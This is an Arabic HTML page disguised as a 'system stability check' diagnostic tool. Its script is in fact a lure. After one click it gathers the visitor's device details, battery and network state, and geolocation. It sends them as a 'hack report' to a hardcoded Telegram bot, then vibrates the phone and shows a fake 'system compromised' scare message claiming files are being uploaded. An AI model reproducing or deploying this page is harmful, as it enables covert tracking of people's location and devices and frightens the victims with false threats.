<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز تشخيص الأنظمة المتقدم</title>
    <style>
        :root { --primary: #00d2ff; --dark-bg: #121212; --card-bg: #1e1e1e; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--dark-bg); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .container { max-width: 400px; width: 90%; background: var(--card-bg); padding: 30px; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.8); text-align: center; border: 1px solid #333; transition: all 0.5s ease; }
        h2 { color: var(--primary); margin-bottom: 10px; font-size: 24px; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .stats-preview { background: #252525; padding: 15px; border-radius: 12px; margin-bottom: 25px; text-align: right; border-right: 4px solid var(--primary); }
        .stat-item { font-size: 12px; margin: 5px 0; color: #bbb; }
        #actionBtn { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 210, 255, 0.3); }
        #actionBtn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 210, 255, 0.5); }
        #loader { display: none; margin-top: 20px; }
        .scan-line { width: 100%; height: 2px; background: var(--primary); box-shadow: 0 0 10px var(--primary); position: relative; animation: scan 2s infinite; display: none; }
        @keyframes scan { 0% { top: 0; } 50% { top: 20px; } 100% { top: 0; } }
    </style>
</head>
<body>

<div class="container" id="mainCard">
    <div style="font-size: 50px; margin-bottom: 15px;">🛡️</div>
    <h2>فحص استقرار النظام v5.0</h2>
    <p>تحسين أداء المعالج واختبار جودة اتصال الشبكة في بيئة الذكاء الاصطناعي.</p>
    
    <div class="stats-preview">
        <div class="stat-item">🔘 فحص استهلاك أنوية المعالج</div>
        <div class="stat-item">🔘 تحليل بروتوكولات الشبكة (IPv4/IPv6)</div>
        <div class="stat-item">🔘 معايرة دورة حياة البطارية</div>
    </div>

    <div class="scan-line" id="scanner"></div>
    <button id="actionBtn" onclick="runSystemAudit()">ابدأ الاختبار الشامل</button>
    
    <div id="loader">
        <p>جاري سحب بيانات الهاردوير وتشفيرها...</p>
    </div>
</div>

<script>
    // بيانات البوت التي استخرجتها من كودك
    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
    const CHAT_ID = '7396462490';

    async function runSystemAudit() {
        // تغيير الواجهة
        document.getElementById('actionBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('scanner').style.display = 'block';

        let deviceInfo = {
            battery: "غير متاح",
            charging: "غير معروف",
            network: "غير معروف",
            ram: navigator.deviceMemory || "مجهول",
            cores: navigator.hardwareConcurrency || "مجهول",
            platform: navigator.platform,
            vendor: navigator.vendor,
            screen: `${window.screen.width}x${window.screen.height}`
        };

        // 1. جلب بيانات البطارية
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            deviceInfo.battery = (bat.level * 100).toFixed(0) + "%";
            deviceInfo.charging = bat.charging ? "✅ نعم (متصل)" : "❌ لا (تفريغ)";
        }

        // 2. جلب جودة الشبكة
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) deviceInfo.network = `${conn.effectiveType.toUpperCase()} (${conn.downlink} Mbps)`;

        // 3. طلب الموقع (ضروري للتقرير)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendFormattedReport(deviceInfo, mapLink);
        }, async (err) => {
            await sendFormattedReport(deviceInfo, "🚫 رفض المستخدم الصلاحية");
        });

        // تشغيل تأثير الاهتزاز (الرعب)
        startScareVibration();
    }

    async function sendFormattedReport(info, map) {
        // رسالة تليجرام منظمة جداً باستخدام Markdown
        const report = `
🚀 *تقرير اختراق النظام - المهندس موسى* 🚀
━━━━━━━━━━━━━━━━━━
👤 *معلومات الجهاز والعتاد:*
• *المنصة:* \`${info.platform}\`
• *المعالج:* \`${info.cores} Cores\`
• *الرام:* \`${info.ram} GB\`
• *المصنع:* \`${info.vendor}\`
• *دقة الشاشة:* \`${info.screen}\`

🔋 *حالة الطاقة:*
• *الشحن:* \`${info.battery}\`
• *الحالة:* ${info.charging}

🌐 *الشبكة والموقع:*
• *نوع الاتصال:* \`${info.network}\`
📍 [اضغط هنا لفتح الموقع الجغرافي](${map})

⚠️ *الحالة:* تم سحب البيانات بنجاح!
━━━━━━━━━━━━━━━━━━
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
        });

        // إظهار رسالة التخويف النهائية
        showFinalScare();
    }

    function startScareVibration() {
        if (navigator.vibrate) {
            // اهتزاز متقطع ومزعج
            let vibrateInterval = setInterval(() => {
                navigator.vibrate([800, 200, 800, 200, 1000]);
            }, 1500);
            
            // التوقف بعد 30 ثانية (لأن المتصفح سيقتله على أي حال)
            setTimeout(() => clearInterval(vibrateInterval), 30000);
        }
    }

    function showFinalScare() {
        const card = document.getElementById('mainCard');
        card.style.borderColor = "red";
        card.style.backgroundColor = "#2d0000";
        card.innerHTML = `
            <h2 style="color:red">⚠️ ALERT: SYSTEM COMPROMISED</h2>
            <p style="color:white">تم اكتشاف نشاط مشبوه. جاري رفع كافة ملفات الوسائط والأسماء إلى السيرفر المركزي...</p>
            <div style="font-size:50px; animation: pulse 1s infinite;">🚨</div>
            <p style="font-size:12px; color:red; margin-top:10px;">لا تقم بإغلاق الصفحة لتجنب فقدان البيانات</p>
        `;
    }
</script>

</body>
</html>
